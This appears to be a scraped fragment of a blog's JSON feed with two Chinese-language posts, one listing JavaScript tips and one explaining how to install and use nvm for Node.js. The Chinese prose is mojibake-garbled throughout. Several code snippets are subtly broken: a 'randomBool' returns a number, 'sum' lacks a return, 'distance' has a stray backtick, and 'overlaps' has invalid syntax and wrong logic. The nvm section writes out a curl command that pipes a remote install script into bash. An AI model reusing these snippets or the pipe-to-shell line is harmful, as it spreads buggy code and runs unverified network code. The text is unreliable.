function isInteger(obj) { return Math.floor(obj) === obj } /* 3. é€šéparseIntåˆ¤æ–· æŸäº›å ´æ™¯ä¸æº–ç¢º */ function isInteger(obj) { return parseInt(obj, 10) === obj } /* 4. é€šéä½é‹ç®—ç¬¦*/ function isInteger(obj) { return (obj | 0) === obj } /* 5.ES6æä¾›äº†Number.isInteger */ é€šé css æª¢æ¸¬ç³»çµ±çš„ä¸»é¡Œè‰²å¾è€Œå…¨å±€ä¿®æ”¹æ¨£å¼ @media çš„å±¬æ€§ prefers-color-scheme å°±å¯ä»¥çŸ¥é“ç•¶å‰çš„ç³»çµ±ä¸»é¡Œï¼Œç•¶ç„¶ä½¿ç”¨å‰éœ€è¦æŸ¥æŸ¥å…¼å®¹æ€§ã€‚\n1 2 @media (prefers-color-scheme: dark) { //... } @media (prefers-color-scheme: light) { //... } javascript ä¹Ÿå¯ä»¥è¼•é¬†åšåˆ°\n1 2 3 4 5 6 7 8 window.addEventListener(\u0026#39;theme-mode\u0026#39;, event =\u0026gt;{ if(event.mode == \u0026#39;dark\u0026#39;){} if(event.mode == \u0026#39;light\u0026#39;){} }) window.matchMedia(\u0026#39;(prefers-color-scheme: dark)\u0026#39;) .addEventListener(\u0026#39;change\u0026#39;, event =\u0026gt; { if (event.matches) {} // dark mode }) æ•¸çµ„éš¨æ©Ÿæ‰“äº‚é †åº é€šé 0.5-Math.random() å¾—åˆ°ä¸€å€‹éš¨æ©Ÿæ•¸ï¼Œå†é€šéå…©æ¬¡ sort æ’åºæ‰“äº‚çš„æ›´å¾¹åº•, ä½†æ˜¯é€™å€‹æ–¹æ³•å¯¦éš›ä¸Šä¸¦ä¸å¤ éš¨æ©Ÿï¼Œå¦‚æœæ˜¯ä¼æ¥­ç´šé‹ç”¨ï¼Œå»ºè­°ä½¿ç”¨ç¬¬äºŒç¨®æ´—ç‰Œç®—æ³•ã€‚\n1 2 3 function shuffle(arr) { return arr.sort(() =\u0026gt; 0.5 - Math.random()). sort(() =\u0026gt; 0.5 - Math.random()); } 1 2 3 4 5 6 7 function shuffle(arr) { for (let i = arr.length - 1; i \u0026gt; 0; i--) { const randomIndex = Math.floor(Math.random() * (i + 1)) ;[arr[i], arr[randomIndex]] = [arr[randomIndex], arr[i]] } return arr } éš¨æ©Ÿç²å–ä¸€å€‹ Boolean å€¼ å’Œä¸Šå€‹åŸç†ç›¸åŒï¼Œé€šééš¨æ©Ÿæ•¸ç²å–ï¼ŒMath.random() çš„å€é–“æ˜¯ 0-0.99ï¼Œç”¨ 0.5 åœ¨ä¸­é–“ç™¾åˆ†ä¹‹äº”åçš„æ¦‚ç‡ã€‚\n1 2 3 function randomBool() { return 0.5 - Math.random() } æŠŠæ•¸çµ„æœ€å¾Œä¸€é …ç§»åˆ°ç¬¬ä¸€é … 1 2 3 function (arr){ return arr.push(arr.shift()); } æŠŠæ•¸çµ„çš„ç¬¬ä¸€é …æ”¾åˆ°æœ€å¾Œä¸€é … 1 2 3 function(arr){ return arr.unshift(arr.pop()); } åˆ©ç”¨ set æ•¸çµ„å»é‡ 1 2 3 function uniqueArr(arr){ return [...new Set(arr)] } dom ç¯€é»å¹³æ»‘æ»¾å‹•åˆ°å¯è¦–å€åŸŸã€é ‚éƒ¨ã€åº•éƒ¨ åŸç”Ÿçš„ scrollTo æ–¹æ³•æ²’æœ‰å‹•ç•«ï¼Œé¡ä¼¼æ–¼éŒ¨é»è·³è½‰ï¼Œæ¯”è¼ƒç”Ÿç¡¬ï¼Œå¯ä»¥é€šéé€™å€‹æ–¹æ³•æœƒè‡ªå¸¶å¹³æ»‘çš„éåº¦æ•ˆæœã€‚\n1 2 3 4 5 6 7 8 9 10 function scrollTo(element) { // é ‚éƒ¨ element.scrollIntoView({ behavior: \u0026#34;smooth\u0026#34;, block: \u0026#34;start\u0026#34; }) // åº•éƒ¨ element.scrollIntoView({ behavior: \u0026#34;smooth\u0026#34;, block: \u0026#34;end\u0026#34; }) // å¯è¦–å€åŸŸ element.scrollIntoView({ behavior: \u0026#34;smooth\u0026#34;}) } ç²å–éš¨æ©Ÿé¡è‰² æ—¥å¸¸æˆ‘å€‘ç¶“å¸¸æœƒéœ€è¦ç²å–ä¸€å€‹éš¨æ©Ÿé¡è‰²ï¼Œé€šééš¨æ©Ÿæ•¸å³å¯å®Œæˆã€‚\n1 2 3 function getRandomColor(){ return `#${Math.floor(Math.random() * 0xffffff) .toString(16)}`; } æª¢æ¸¬æ˜¯å¦çˆ²ç©ºå°è±¡ é€šéä½¿ç”¨ ES6 çš„ Reflect éœæ…‹æ–¹æ³•åˆ¤æ–·ä»–çš„é•·åº¦å°±å¯ä»¥åˆ¤æ–·æ˜¯å¦æ˜¯ç©ºæ•¸çµ„äº†ï¼Œä¹Ÿå¯ä»¥é€šé Object.keys() ä¾†åˆ¤æ–·ã€‚\n1 2 3 function isEmpty(obj){ return Reflect.ownKeys(obj).length === 0 \u0026amp;\u0026amp; obj.constructor === Object; } Boolean è½‰æ› ä¸€äº›å ´æ™¯ä¸‹æˆ‘å€‘æœƒå°‡ boolean å€¼å®šç¾©çˆ²å ´æ™¯ï¼Œä½†æ˜¯åœ¨ js ä¸­éç©ºçš„å­—ç¬¦ä¸²éƒ½æœƒè¢«èªçˆ²æ˜¯ trueã€‚\n1 2 3 4 5 6 7 function toBoolean(value, truthyValues = [\u0026#39;true\u0026#39;]){ const normalizedValue = String(value).toLowerCase().trim(); return truthyValues.includes(normalizedValue); } toBoolean(\u0026#39;TRUE\u0026#39;); // true toBoolean(\u0026#39;FALSE\u0026#39;); // false toBoolean(\u0026#39;YES\u0026#39;, [\u0026#39;yes\u0026#39;]); // true å„ç¨®æ•¸çµ„è¤‡è£½æ–¹æ³• æ•¸çµ„å…‹éš†çš„æ–¹æ³•å…¶å¯¦ç‰¹åˆ¥å¤šäº†ï¼Œçœ‹çœ‹æœ‰æ²’æœ‰ä½ æ²’è¦‹éçš„ï¼\n1 2 3 4 5 6 7 const clone = (arr) =\u0026gt; arr.slice(0); const clone = (arr) =\u0026gt; [...arr]; const clone = (arr) =\u0026gt; Array.from(arr); const clone = (arr) =\u0026gt; arr.map((x) =\u0026gt; x); const clone = (arr) =\u0026gt; JSON.parse(JSON.stringify(arr)); const clone = (arr) =\u0026gt; arr.concat([]); const clone = (arr) =\u0026gt; structuredClone(arr); æ¯”è¼ƒå…©å€‹æ™‚é–“å¤§å° é€šéèª¿ç”¨ getTime ç²å–æ™‚é–“æˆ³æ¯”è¼ƒå°±å¯ä»¥äº†ã€‚\n1 2 3 function compare(a, b){ return a.getTime() \u0026gt; b.getTime(); } è¨ˆç®—å…©å€‹æ™‚é–“ä¹‹é–“çš„æœˆä»½å·®ç•° 1 2 3 function monthDiff(startDate, endDate){ return Math.max(0, (endDate.getFullYear() - startDate.getFullYear()) * 12 - startDate.getMonth() + endDate.getMonth()); } ä¸€æ­¥é©Ÿå¾æ™‚é–“ä¸­æå–å¹´æœˆæ—¥æ™‚åˆ†ç§’ æ™‚é–“æ ¼å¼åŒ–è¼•é¬†è§£æ±ºï¼Œä¸€æ­¥é©Ÿç²å–åˆ°å¹´æœˆæ—¥æ™‚åˆ†ç§’æ¯«ç§’ï¼Œç”±æ–¼ toISOString æœƒä¸Ÿå¤±æ™‚å€ï¼Œå°è‡´æ™‚é–“å·®å…«å°æ™‚ï¼Œæ‰€ä»¥åœ¨æ ¼å¼åŒ–ä¹‹å‰æˆ‘å€‘åŠ ä¸Šå…«å€‹å°æ™‚æ™‚é–“å³å¯ã€‚\n1 2 3 4 5 6 function extract(date){ const d = new Date(new Date(date).getTime() + 8*3600*1000); return new Date(d).toISOString().split(/[^0-9]/).slice(0, -1); } console.log(extract(new Date())) // [\u0026#39;2022\u0026#39;, \u0026#39;09\u0026#39;, \u0026#39;19\u0026#39;, \u0026#39;18\u0026#39;, \u0026#39;06\u0026#39;, \u0026#39;11\u0026#39;, \u0026#39;187\u0026#39;] åˆ¤æ–·ä¸€å€‹åƒæ•¸æ˜¯ä¸æ˜¯å‡½æ•¸ æœ‰æ™‚å€™æˆ‘å€‘çš„æ–¹æ³•éœ€è¦å‚³å…¥ä¸€å€‹å‡½æ•¸å›èª¿ï¼Œä½†æ˜¯éœ€è¦æª¢æ¸¬å…¶é¡å‹ï¼Œæˆ‘å€‘å¯ä»¥é€šé Object çš„åŸå‹æ–¹æ³•å»æª¢æ¸¬ï¼Œç•¶ç„¶é€™å€‹æ–¹æ³•å¯ä»¥æº–ç¢ºæª¢æ¸¬ä»»ä½•é¡å‹ã€‚\n1 2 3 function isFunction(v){ return [\u0026#39;[object Function]\u0026#39;, \u0026#39;[object GeneratorFunction]\u0026#39;, \u0026#39;[object AsyncFunction]\u0026#39;, \u0026#39;[object Promise]\u0026#39;].includes(Object.prototype.toString.call(v)); } è¨ˆç®—å…©å€‹åº§æ¨™ä¹‹é–“çš„è·é›¢ 1 2 3 function distance(p1, p2){ return `Math.sqrt(Math.pow(p2.x - p1.x, 2) + Math.pow(p2.y - p1.y, 2)); } æª¢æ¸¬å…©å€‹ dom ç¯€é»æ˜¯å¦è¦†è“‹é‡ç–Š æœ‰äº›å ´æ™¯ä¸‹æˆ‘å€‘éœ€è¦åˆ¤æ–· dom æ˜¯å¦ç™¼ç”Ÿç¢°æ’äº†æˆ–è€…é‡ç–Šäº†ï¼Œæˆ‘å€‘å¯ä»¥é€šé getBoundingClientRect ç²å–åˆ° dom çš„ x1ã€y1ã€x2ã€y2 åº§æ¨™ç„¶å¾Œé€²è¡Œåº§æ¨™æ¯”å°å³å¯åˆ¤æ–·å‡ºä¾†ã€‚\n1 2 3 function overlaps = (a, b) { return (a.x1 \u0026lt; b.x2 \u0026amp;\u0026amp; b.x1 \u0026lt; a.x2) || (a.y1 \u0026lt; b.y2 \u0026amp;\u0026amp; b.y1 \u0026lt; a.y2); } åˆ¤æ–·æ˜¯å¦æ˜¯ Nodejs ç’°å¢ƒ å‰ç«¯çš„æ—¥å¸¸é–‹ç™¼æ˜¯é›¢ä¸é–‹ nodejs çš„ï¼Œé€šéåˆ¤æ–·å…¨å±€ç’°å¢ƒä¾†æª¢æ¸¬æ˜¯å¦æ˜¯ nodejs ç’°å¢ƒã€‚\n1 2 3 function isNode(){ return typeof process !== \u0026#39;undefined\u0026#39; \u0026amp;\u0026amp; process.versions != null \u0026amp;\u0026amp; process.versions.node != null; } åƒæ•¸æ±‚å’Œ ä¹‹å‰çœ‹åˆ°æœ‰é€šéå‡½æ•¸æŸ¯ç†åŒ–å½¢å¼ä¾†æ±‚å’Œçš„ï¼Œé€šé reduce ä¸€è¡Œå³å¯ã€‚\n1 2 3 function sum(...args){ args.reduce((a, b) =\u0026gt; a + b); } ","date":"2022-10-27T00:00:00Z","image":"https://live.staticflickr.com/65535/52457807569_15f64548d9_o.jpg","permalink":"https://wayneblog.ga/2022-10-27/js-30-keypoints/","title":"30 å€‹ Javascript çŸ¥è­˜é»ç¸½çµï¼Œç¸½æœ‰ä½ ä¸æœƒçš„ï¼"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nnvm æ˜¯ Node.js çš„ç‰ˆæœ¬ç®¡ç†å™¨ (version manager)ï¼Œå¯åœ¨åŒä¸€å°ä¸»æ©Ÿä¸Šå®‰è£å¤šå€‹ç‰ˆæœ¬çš„ Node.js ç’°å¢ƒï¼Œå› ç‚ºä¸åŒå°ˆæ¡ˆå¯èƒ½æœƒä½¿ç”¨ä¸åŒçš„ Node.js ç‰ˆæœ¬ï¼Œé‚£å°±éœ€è¦é€éä¸€å€‹ç‰ˆæœ¬ç®¡ç†å™¨ä¾†åˆ‡æ›ä¸åŒçš„ Node.js ç‰ˆæœ¬ã€‚\nå®‰è£ NVM æ¥ä¸‹ä¾†åˆ° NVM çš„ GitHub å„²å­˜åº«ä¸‹è¼‰ï¼Œç„¡è«–ä½ æ˜¯ Windowsã€MacOSã€Unix ç³»çµ±éƒ½æœ‰å°æ‡‰çš„å®‰è£æ–¹å¼ã€‚\nWindows NVM for Windows æœ‰æä¾›å®‰è£å·¥å…·ï¼Œä¸‹è¼‰å¾Œç…§è‘—å®‰è£ç²¾éˆä¾åºå®Œæˆå³å¯é‹ä½œï¼Œä¸‹è¼‰é€£çµã€‚\nè«‹é¸æ“‡ nvm-setup ä¸‹è¼‰ä¸¦å®‰è£\nä¸‹è¼‰å¾Œä¾å¾ªè‘—å®‰è£ç²¾éˆå³å¯å®Œæˆã€‚\nå®Œæˆå¾Œï¼Œæ‰“é–‹ã€Œå‘½ä»¤æç¤ºå­—å…ƒã€å¯ä»¥è©¦è‘—è¼¸å…¥ nvmï¼Œå¦‚æœçœ‹åˆ°é¡ä¼¼ä»¥ä¸‹ç•«é¢å°±ç®—æ˜¯å®Œæˆäº†ã€‚\nMacOS MacOS å‰‡æ˜¯ä½¿ç”¨æŒ‡ä»¤é€²è¡Œå®‰è£ï¼Œæ‰“é–‹ã€Œçµ‚ç«¯æ©Ÿã€æˆ–è‡ªè¡Œå®‰è£çš„ã€ŒiTermã€ç­‰å·¥å…·ï¼Œè¼¸å…¥ä»¥ä¸‹æŒ‡ä»¤å³å¯é–‹å§‹å®‰è£ï¼Œï¼ˆæ›´å¤šç‰ˆæœ¬é€£çµï¼‰ã€‚\n1 curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash å®‰è£å¾Œé æœŸæœƒé¡¯ç¤ºä»¥ä¸‹ç‰‡æ®µåŠç®—å®‰è£å®Œæˆï¼Œè€Œæ­¤æ™‚å¦‚æœä½ æœ‰å®‰è£å…¶å®ƒæŒ‡ä»¤å·¥å…·ï¼Œæœ‰å¯èƒ½æœƒç™¼ç”Ÿè¼¸å…¥ nvm ç„¡æ³•å‘¼å«çš„ç‹€æ³ï¼ˆä¾‹å¦‚ï¼šzsh: command not found: nvmï¼‰ã€‚\næ¥ä¸‹ä¾†å¯ä»¥åœ¨ä½ æ‰€ä½¿ç”¨çš„å‘½ä»¤è¨­å®šæª”æ¡ˆåŠ å…¥ä»¥ä¸‹ç‰‡æ®µç¨‹å¼ç¢¼ï¼Œä»¥ä¸‹æä¾› bashã€zsh çš„èªªæ˜ï¼Œå…©è€…ä¾æ“šç’°å¢ƒé¸æ“‡å…¶ä¸€å³å¯ï¼š\nbash(é è¨­) zsh bash é è¨­çš„æƒ…æ³ä¸‹ï¼ŒMacOS ä¸­å¯èƒ½æ²’æœ‰ä»»ä½•ä¸€å€‹æŒ‡ä»¤è¨­å®šæª”æ¡ˆï¼Œæ­¤æ™‚å¯ä»¥ä½¿ç”¨ touch ~/.bash_profile æ–°å¢ä¸€å€‹æ–‡å­—æª”æ¡ˆåœ¨æ ¹ç›®éŒ„ä¸Šï¼Œæ¥ä¸‹ä¾†å›åˆ°è³‡æ–™æ ¹ç›®éŒ„å¯ä»¥æ‰¾åˆ° .bash_profileï¼Œæ²’çœ‹åˆ°çš„è©±ä»£è¡¨æœªé–‹å•Ÿéš±è—æª”æ¡ˆé¡¯ç¤ºï¼Œå¯ä»¥æŒ‰ä¸‹ Command + Shift+ . é¡¯ç¤ºã€‚\næ¥ä¸‹ä¾†ä½¿ç”¨ä»»ä½•æ–‡å­—ç·¨è¼¯å™¨æ‰“é–‹è©²æª”æ¡ˆï¼Œä¸¦åŠ å…¥ä»¥ä¸‹ç¨‹å¼ç¢¼å­˜æª”å³å¯ã€‚\n1 2 3 export NVM_DIR=\u0026#34;$HOME/.nvm\u0026#34; [ -s \u0026#34;$NVM_DIR/nvm.sh\u0026#34; ] \u0026amp;\u0026amp; \\. \u0026#34;$NVM_DIR/nvm.sh\u0026#34; # This loads nvm [ -s \u0026#34;$NVM_DIR/bash_completion\u0026#34; ] \u0026amp;\u0026amp; \\. \u0026#34;$NVM_DIR/bash_completion\u0026#34; # This loads nvm bash_completion zsh å¯ä»¥æ‰“é–‹ .zshrc åŠ å…¥ä»¥ä¸‹ç‰‡æ®µå¾Œé‡å•Ÿï¼ˆæ³¨æ„ï¼š.zshrc é€šå¸¸åœ¨ä½¿ç”¨è€…æ ¹ç›®éŒ„ä¸‹ä¸¦ä¸”ç‚ºéš±è—æª”ï¼Œæ‰¾åˆ°å¾Œä½¿ç”¨ä»»ä½•æ–‡å­—ç·¨è¼¯å™¨æ‰“é–‹ç·¨è¼¯ï¼‰ã€‚\n1 2 3 export NVM_DIR=\u0026#34;$HOME/.nvm\u0026#34; [ -s \u0026#34;$NVM_DIR/nvm.sh\u0026#34; ] \u0026amp;\u0026amp; \\. \u0026#34;$NVM_DIR/nvm.sh\u0026#34; # This loads nvm [ -s \u0026#34;$NVM_DIR/bash_completion\u0026#34; ] \u0026amp;\u0026amp; \\. \u0026#34;$NVM_DIR/bash_completion\u0026#34; # This loads nvm bash_completion è¨­å®šå®Œæˆä»¥å¾Œï¼ŒæŒ‰ä¸‹ nvm å°±æœƒè·³å‡ºå¦‚ä¸‹åœ–å°±ç®—å®Œæˆäº†ã€‚\næ³¨æ„ï¼š\nä½¿ç”¨ nvm æ™‚ï¼Œä¸éœ€è¦ sudo å³å¯ä½¿ç”¨ npm -g å…¨åŸŸå®‰è£æ¨¡çµ„ï¼Œæ‰€ä»¥èˆ‡å…¶åŸ·è¡Œ sudo npm i -gï¼Œä¸å¦‚åŸ·è¡Œ npm i -g è‹¥ä½ æœ‰ ~/.npmrcï¼Œè«‹ç¢ºä¿è£¡é¢ä¸åŒ…å«ä»»ä½• prefix çš„è¨­å®š (å› ç‚ºèˆ‡ nvm ä¸ç›¸å®¹) ä½ å¯ä»¥ (ä½†ä¸æ‡‰è©²) ä¿ç•™ä»¥å‰åœ¨ \u0026ldquo;ç³»çµ±\u0026rdquo; å®‰è£çš„ Node.jsï¼Œä½† nvm åªå°ä½ çš„ä½¿ç”¨è€…å¸³æˆ¶ (ç”¨æ–¼å®‰è£ nvm çš„ä½¿ç”¨è€…å¸³æˆ¶) å¯ç”¨ã€‚å¯èƒ½æœƒå°è‡´ç‰ˆæœ¬ä¸ matchï¼Œå› ç‚ºå…¶ä»–ä½¿ç”¨è€…æœƒä½¿ç”¨ /usr/local/lib/node_modules/*ï¼Œè€Œä½¿ç”¨è€…å¸³æˆ¶æœƒä½¿ç”¨ ~/.nvm/versions/node/vX.X.X/lib/node_modules/* å¸¸ç”¨çš„ NVM æŒ‡ä»¤ ç›´æ¥è¼¸å…¥ nvm åŠå¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„æŒ‡ä»¤åˆ—è¡¨ï¼Œåœ¨æ­¤åƒ…åˆ—å‡ºæœ€å¸¸è¦‹çš„å¹¾å€‹æŒ‡ä»¤ï¼ˆåŸºæœ¬ä¸Šå¸¸ç”¨çš„åªæœ‰å…©ä¸‰å€‹ï¼Œå‰©ä¸‹å¹¾å€‹åªè¦èªè­˜å³å¯ï¼‰\nversionï¼šç¢ºèª NVM æ˜¯å¦å®‰è£æˆåŠŸ (aliasï¼šv) Usageï¼š 1 2 3 nvm version # or nvm v æŸ¥çœ‹ NVM çš„ç‰ˆæœ¬ 1 2 $ nvm v 1.1.9 installï¼šåˆ©ç”¨ NVM å®‰è£ Node.js Usageï¼š 1 2 3 4 5 6 nvm install # or # {version} æ¬²å®‰è£çš„ Node.js ç‰ˆæœ¬ # {arch} æ¬²å®‰è£çš„ system archï¼š32ã€64ã€\u0026#34;all\u0026#34; (é è¨­ç‚ºç•¶å‰ç³»çµ±) nvm install \u0026lt;version\u0026gt; [arch] å®‰è£ NVM å¾Œï¼Œå…¶å¯¦é‚„æ²’å®‰è£ Node ç’°å¢ƒï¼š\n1 2 $ node zsh: command not found: node å¦‚æœåŸ·è¡Œä¸‹é¢æŒ‡ä»¤ï¼Œæœƒæé†’ä½ éœ€è¦åŸ·è¡Œ install æŒ‡ä»¤æ‰èƒ½å®‰è£ Node.jsï¼š\n1 2 3 4 $ nvm use node N/A: version \u0026#34;node -\u0026gt; N/A\u0026#34; is not yet installed. You need to run \u0026#34;nvm install node\u0026#34; to install it before using it. å®‰è£æœ€æ–°ç‰ˆçš„ Node.jsï¼š\n1 2 3 4 5 6 7 8 $ nvm install node Downloading and installing node v12.8.1... Downloading https://nodejs.org/dist/v12.8.1/node-v12.8.1-linux-x64.tar.xz... #################################################################################################### 100.0% Computing checksum with sha256sum Checksums matched! Now using node v12.8.1 (npm v6.10.2) Creating default alias: default -\u0026gt; node (-\u0026gt; v12.8.1) å¦‚æœè¦æŒ‡å®šå®‰è£ç‰ˆæœ¬ï¼Œå¯ä»¥ç›´æ¥æŒ‡å®šç‰ˆæœ¬è™Ÿ 1 $ nvm install 16.18.0 å®‰è£çš„ç¬¬ä¸€å€‹ç‰ˆæœ¬çš„ Node.js æœƒæˆç‚º nvm çš„é è¨­ç‰ˆæœ¬ï¼Œæ–°çš„ shell å°±æœƒä»¥é è¨­ç‰ˆæœ¬çš„ Node.js ä¾†ä½¿ç”¨ (ä¾‹å¦‚ï¼šnvm alias default)ã€‚\næŸ¥çœ‹ç›®å‰å®‰è£ Node.js çš„ç‰ˆæœ¬ï¼š\n1 2 $ node -v v16.18.0 uninstallï¼šåˆ©ç”¨ NVM è§£é™¤å®‰è£æŒ‡å®šçš„ Node.js ç‰ˆæœ¬ Usageï¼š 1 nvm uninstall \u0026lt;version\u0026gt; listï¼šæŸ¥çœ‹å¯ç”¨çš„å®‰è£ç‰ˆæœ¬ (aliasï¼šls) Usageï¼š 1 2 3 nvm list # or nvm ls nvm listï¼šæŸ¥çœ‹å·²å®‰è£çš„ç‰ˆæœ¬ nvm list installedï¼šæŸ¥çœ‹å·²å®‰è£çš„ç‰ˆæœ¬ nvm list availableï¼šæŸ¥çœ‹é ç«¯å¯å®‰è£çš„ç‰ˆæœ¬ æŸ¥çœ‹ç›®å‰ Node.js æœ‰å“ªäº›å¯ç”¨ç‰ˆæœ¬å¯å®‰è£ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 $ nvm ls available | CURRENT | LTS | OLD STABLE | OLD UNSTABLE | |--------------|--------------|--------------|--------------| | 19.0.0 | 18.12.0 | 0.12.18 | 0.11.16 | | 18.11.0 | 16.18.0 | 0.12.17 | 0.11.15 | | 18.10.0 | 16.17.1 | 0.12.16 | 0.11.14 | | 18.9.1 | 16.17.0 | 0.12.15 | 0.11.13 | | 18.9.0 | 16.16.0 | 0.12.14 | 0.11.12 | | 18.8.0 | 16.15.1 | 0.12.13 | 0.11.11 | | 18.7.0 | 16.15.0 | 0.12.12 | 0.11.10 | | 18.6.0 | 16.14.2 | 0.12.11 | 0.11.9 | | 18.5.0 | 16.14.1 | 0.12.10 | 0.11.8 | | 18.4.0 | 16.14.0 | 0.12.9 | 0.11.7 | | 18.3.0 | 16.13.2 | 0.12.8 | 0.11.6 | | 18.2.0 | 16.13.1 | 0.12.7 | 0.11.5 | | 18.1.0 | 16.13.0 | 0.12.6 | 0.11.4 | | 18.0.0 | 14.20.1 | 0.12.5 | 0.11.3 | | 17.9.1 | 14.20.0 | 0.12.4 | 0.11.2 | | 17.9.0 | 14.19.3 | 0.12.3 | 0.11.1 | | 17.8.0 | 14.19.2 | 0.12.2 | 0.11.0 | | 17.7.2 | 14.19.1 | 0.12.1 | 0.9.12 | | 17.7.1 | 14.19.0 | 0.12.0 | 0.9.11 | | 17.7.0 | 14.18.3 | 0.10.48 | 0.9.10 | é€šå¸¸æœƒé¸æ“‡å®‰è£ LTS (Long-term supportï¼Œé•·æœŸæ”¯æ´) ç‰ˆ\næŸ¥çœ‹ç›®å‰å·²å®‰è£çš„ç‰ˆæœ¬ 1 2 3 $ nvm ls * 16.18.0 (Currently using 64-bit executable) 14.18.0 useï¼šåˆ‡æ› Node.js ç‰ˆæœ¬ Usageï¼š 1 2 3 4 5 6 nvm use # or # {version} æ¬²åˆ‡æ›çš„ Node.js ç‰ˆæœ¬ # {arch} æ¬²åˆ‡æ›çš„ system archï¼š32ã€64ã€\u0026#34;all\u0026#34; (é è¨­ç‚ºç•¶å‰ç³»çµ±) nvm use \u0026lt;version\u0026gt; [arch] å¦‚æœè¦ä½¿ç”¨ nvm åˆ‡æ›æ­£åœ¨ä½¿ç”¨çš„ Node.js ç‰ˆæœ¬ï¼Œå¯ç”¨ use æŒ‡ä»¤ 1 nvm use v16.18.0 å¦‚æœåˆ‡æ›çš„ç›®æ¨™ç‰ˆæœ¬é‚„æ²’å®‰è£ï¼Œnvm æœƒæé†’ä½ è¦å®‰è£ï¼š\n1 2 $ nvm use v14.18.0 node v14.18.0 (64-bit) is not installed. é€é nvm å®‰è£ Node.js æ™‚ï¼Œnvm æœƒå°‡ä¸åŒçš„ Node.js ç‰ˆæœ¬å„²å­˜åœ¨ ~/.nvm/versions/node/vX.X.Xï¼Œç„¶å¾Œå†ä¿®æ”¹ $PATHï¼Œå°‡æŒ‡å®šç‰ˆæœ¬çš„ Node.js è·¯å¾‘åŠ å…¥ï¼š\n1 2 3 4 5 6 7 8 9 10 $ nvm current v10.16.3 $ echo $PATH /home/titan/.nvm/versions/node/v10.16.3/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin $ use v12.13.1 $ nvm current v12.13.1 $ echo $PATH /home/titan/.nvm/versions/node/v12.13.1/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin åœ¨ nvm çš„å„å€‹ Node.js ç‰ˆæœ¬å®‰è£çš„å…¨åŸŸå¥—ä»¶éƒ½æœƒåœ¨å„è‡ªç‰ˆæœ¬çš„ç›®éŒ„å…§å®‰è£ï¼Œæ‰€ä»¥åœ¨åˆ‡æ›è‡³æ–°å®‰è£çš„ Node.js ç‰ˆæœ¬å¾Œéœ€è¦é‡æ–°å®‰è£ï¼Œä¹Ÿå› ç‚ºå¦‚æ­¤ï¼Œä¸åŒç‰ˆæœ¬é–“çš„å¥—ä»¶å°±ä¸æœƒæœ‰è¡çªå•é¡Œã€‚\ncurrentï¼šæŸ¥çœ‹ç›®å‰ä½¿ç”¨çš„ç‰ˆæœ¬ Usageï¼š 1 nvm current å¦‚æœå¿˜è¨˜è‡ªå·±åˆ‡æ›åˆ°å“ªå€‹ç‰ˆæœ¬ï¼Œå¯ä»¥ç”¨ current æŒ‡ä»¤ 1 2 $ nvm current v16.18.0 runï¼šç›´æ¥åŸ·è¡Œ Node.js (NVM 1.1.9ç‰ˆå·²æ‹”é™¤) å¦‚æœè¦ç›´æ¥åŸ·è¡Œ Node.jsï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢æŒ‡ä»¤ 1 2 3 4 5 $ nvm run node Running node v16.18.0 (npm v8.19.2) Welcome to Node.js v16.18.0. Type \u0026#34;.help\u0026#34; for more information. \u0026gt; execï¼šæŒ‡å®šè¦åŸ·è¡Œçš„ Node.js ç‰ˆæœ¬ (NVM 1.1.9ç‰ˆå·²æ‹”é™¤) 1 2 3 4 5 $ nvm exec 12.8.1 node Running node v12.8.1 (npm v6.10.2) Welcome to Node.js v12.8.1. Type \u0026#34;.help\u0026#34; for more information. \u0026gt; whichï¼šå¯Ÿçœ‹ Node.js çš„å®‰è£è·¯å¾‘ (NVM 1.1.9ç‰ˆå·²æ‹”é™¤) åŸ·è¡Œä¸‹é¢æŒ‡ä»¤å¯ä»¥æŸ¥çœ‹ç‰¹å®šç‰ˆæœ¬çš„ Node.js çš„å®‰è£è·¯å¾‘ 1 2 $ nvm which 12.8.1 /home/titan/.nvm/versions/node/v12.8.1/bin/node aliasï¼šæŸ¥çœ‹åˆ¥åã€è¨­å®šåˆ¥å Usageï¼š 1 2 3 4 5 6 7 8 9 10 11 12 $ nvm alias default -\u0026gt; v10.16.3 node -\u0026gt; stable (-\u0026gt; v12.8.1) (default) stable -\u0026gt; 12.8 (-\u0026gt; v12.8.1) (default) iojs -\u0026gt; N/A (default) unstable -\u0026gt; N/A (default) lts/* -\u0026gt; lts/erbium (-\u0026gt; N/A) lts/argon -\u0026gt; v4.9.1 (-\u0026gt; N/A) lts/boron -\u0026gt; v6.17.1 (-\u0026gt; N/A) lts/carbon -\u0026gt; v8.16.2 (-\u0026gt; N/A) lts/dubnium -\u0026gt; v10.17.0 (-\u0026gt; N/A) lts/erbium -\u0026gt; v12.13.0 (-\u0026gt; N/A) å¦‚ä¸‹åœ–æœ‰äº›ç‰ˆæœ¬çš„æ–‡å­—æ˜¯ç´…è‰²æˆ–æ˜¯é¡¯ç¤º N/Aï¼Œå°±ä»£è¡¨è©²ç‰ˆæœ¬æœªåœ¨é›»è…¦å®‰è£ é è¨­ alias å¯ä»¥å–ä»£ç‰ˆæœ¬è™Ÿ nodeï¼šå®‰è£æœ€æ–°ç‰ˆçš„ Node.js iojsï¼šå®‰è£æœ€æ–°ç‰ˆçš„ io.js stableï¼šæ­¤ alias å·²æ£„ç”¨ï¼Œåƒ…é©ç”¨æ–¼ v0.12 ä»¥åŠæ›´èˆŠç‰ˆï¼Œç›®å‰æ”¹ç‚º node alias unstableï¼šæ­¤ alias ç‚º v0.11ï¼Œæœ€å¾Œä¸€å€‹ â€œunstableâ€ (ä¸ç©©å®š) Node releaseï¼Œåœ¨ v1.0 ä¹‹å¾Œçš„ç‰ˆæœ¬éƒ½æ˜¯ç©©å®šç‰ˆ (in SemVer, versions communicate breakage, not stability) å¯åœ¨ä¸‹é¢é€™äº›æŒ‡ä»¤ä½¿ç”¨ä»¥ä¸Šé è¨­åˆ¥åï¼š\nnvm install nvm use nvm run nvm exec nvm which â€¦ ç­‰ è¨­å®šåˆ¥å 1 2 $ nvm alias v16-test v16.18.0 v16-test -\u0026gt; v16.18.0 æ¥è‘—ç”¨ nvm alias 